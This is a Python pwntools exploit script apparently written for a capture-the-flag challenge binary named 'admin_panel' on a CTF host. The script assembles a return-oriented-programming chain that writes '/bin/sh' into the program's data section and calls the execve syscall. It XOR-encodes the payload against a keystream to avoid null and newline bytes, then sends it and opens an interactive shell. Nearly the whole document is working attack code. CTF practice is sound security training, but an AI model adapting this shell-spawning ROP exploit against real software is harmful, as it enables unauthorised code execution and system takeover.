#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.terminal = ["konsole", "-e"]

exe = context.binary = ELF('admin_panel')

host = args.HOST or 'challenges.ctfd.io'
port = int(args.PORT or 30514)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
#tbreak *0x{exe.entry:x}
#b *0x004011f4
continue
'''.format(**locals())

# -- Exploit goes here --

# This is xored with A's
with open("keystream.bin", 'rb') as f:
  ks = f.read()

bad_chars = {
#  47: b"\x10",
#  66: b"\x10",
}

return_addr = 0x464646464646
offset = 8

io = start()

# ROPchain
payload = p64(0x00000000004012b3)     # pop rdi; ret;
payload += p64(0x00404040)            #   .data start

# Pad to avoid null bytes
payload += p64(0x00000000004012b1)    # pop rsi; pop r15; ret;
payload += p64(0x0)
payload += p64(0x0)
# Pad end

payload += p64(0x0040124c)            # pop rax; rbx; ret;
payload += p64(0x00404040)            #   .data start, this will inject /bin/sh
payload += b"/bin/sh\x00"             #   /bin/sh

# Pad to avoid null bytes
payload += p64(0x00000000004012b1)    # pop rsi; pop r15; ret;
payload += p64(0x0)                   #   argv == null
payload += p64(0x0)
# Pad end

payload += p64(0x0000000000401229)    # mov [rax], rbx; ret;      Injects /bin/sh in memory

# Pad to avoid null bytes
payload += p64(0x00000000004012b1)    # pop rsi; pop r15; ret;
payload += p64(0x4141414141414141)    
payload += p64(0x4141414141414141)
# Pad end

payload += p64(0x000000000040124c)    # pop rax; rbx; ret;
payload += p64(59)                    #   59 is execve syscall number
payload += p64(0)
payload += p64(0x004011eb)            # pop r10; mov r15, r10; add r10, 0x28; jmp r10
payload += p64(0x00401201 - 0x28)     # This ensures the jmp r10 jmp to a return;

payload += p64(0x00000000004012b1)    # pop rsi; pop r15; ret;
payload += p64(0)                     #   argv == null
payload += p64(0)

payload += p64(0x00000000004011e6)    # pop rdx; push r10; syscall;     r10 should act as a nop
payload += p64(0x0)                   #   envp == null

for (idx, new_val) in bad_chars.items():
  payload = payload[:idx] + new_val + payload[idx+1:]

payload = bytes([a ^ b ^ 0x41 for a, b in zip(ks, payload)])

print(len(ks))

if b"\x00" in payload:
  print("Payload contains null byte at " + str(payload.index(b"\x00")))
if b"\n" in payload:
  print("Payload contains line feed at " + str(payload.index(b"\x0a")))

payload = b"A" * offset + payload + b"C" * (0x500 - len(payload) - 8)

print(payload)

io.sendline(payload)

io.interactive()

